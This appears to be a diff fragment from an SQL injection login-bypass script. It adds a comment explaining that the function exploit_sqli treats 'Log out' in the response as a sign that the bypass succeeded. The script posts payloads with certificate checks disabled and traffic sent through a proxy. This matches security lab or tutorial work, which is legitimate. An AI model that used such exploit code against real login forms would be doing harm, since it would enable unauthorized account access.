@@ -36,6 +36,7 @@ def exploit_sqli(s, url, payload):
     r = s.post(url, data=data, verify=False, proxies=proxies)
     # reading in the response to the POST request and storing as a variable
     res = r.text
+    # if Log out appears in the res variable it means we have successfully logged in.
     if "Log out" in res:
          return True
     else:
